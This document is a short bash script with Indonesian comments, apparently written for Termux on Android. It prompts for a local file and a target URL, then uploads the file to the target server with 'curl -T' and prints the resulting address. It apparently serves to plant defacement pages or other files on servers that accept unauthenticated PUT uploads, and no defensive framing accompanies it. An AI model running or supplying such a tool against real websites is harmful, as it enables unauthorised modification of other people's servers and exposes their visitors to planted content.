clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

clear
cd /sdcard

echo -n $ku"script:"
read sc
echo""
echo $pu"================="
echo -n $ku"target:"
read tg
echo""
echo -n $i"target : $tg !" $cy"lanjut gan.."
read trgt
curl -T /sdcard/$sc $tg
echo""
echo""
echo $me"=============================="
echo $ku "hasil: $cy $tg/$sc"
echo $me"=============================="
